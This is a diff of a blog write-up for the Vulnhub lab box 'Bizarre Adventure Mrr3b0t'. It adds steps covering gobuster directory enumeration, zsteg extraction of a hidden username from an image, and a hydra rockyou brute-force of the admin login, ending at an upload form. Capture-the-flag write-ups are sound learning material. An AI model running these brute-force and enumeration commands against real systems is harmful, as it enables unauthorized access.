@@ -3,7 +3,7 @@ title: Vulnhub - Bizarre Adventure Mrr3b0t
 description: My writeup on Bizarre Adventure Mrr3b0t box.
 categories:
  - vulnhub
-tags: vulnhub hydra
+tags: vulnhub hydra stego
 ---
 
 ![](https://images-na.ssl-images-amazon.com/images/I/71Z2amvT-tL._AC_SL1062_.jpg)
@@ -12,7 +12,7 @@ You can find the machine there > [Bizarre Adventure Mrr3b0t](https://www.vulnhub
 
 ## Summary
 
-Let's pwn it! :sunglasses:
+This box is really similar to Bizarre Adventure Sticky Fingers. Let's pwn it! :sunglasses:
 
 ## Enumeration/Reconnaissance
 
@@ -52,3 +52,55 @@ PORT     STATE SERVICE VERSION
 |_http-title: Eskwela Template
 5355/tcp open  llmnr?
 ```
+
+We can see a static website, let's run `gobuster` on it.
+
+```
+$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html                
+/images (Status: 301)
+/index.html (Status: 200)
+/css (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/fonts (Status: 301)
+/administrator (Status: 301)
+```
+
+`/administrator` has a login panel, `/images` has a `flag.txt.txt` file in with a message:
+
+```
+$ curl http://$ip/images/flag.txt.txt
+Almost!
+
+Did you notice something hidden?
+```
+
+Hmm, then i noticed that under `/images` there is a `hidden.png` image. Ugh stego stuff! Why!? :disappointed: Anyway i tried the basics like `strings` but nothing. It's `.png` so we can't run `steghide` etc, one option left that is [Zsteg](https://github.com/zed-0xff/zsteg){:target="_blank"}! 
+
+You can install it by:
+
+```
+$ gem install zsteg
+```
+
+```
+$ zsteg -a hidden.png 
+b1,r,lsb,xy         .. file: old packed data
+b1,rgb,lsb,xy       .. text: "Did you find the message? Take the Mrrobot user and break your password, just don't think too much!"
+```
+
+We have a user! `mrrobot` let's fire up hydra! :fire:
+
+```
+$ hydra -l mrrobot -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed"
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.1.13:80/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed
+[80][http-post-form] host: 192.168.1.13   login: mrrobot   password: secret
+```
+
+We're in as `mrrobot:secret` & we can see an upload form:
+
+![](https://i.imgur.com/Lw6pd9i.png)
+
+
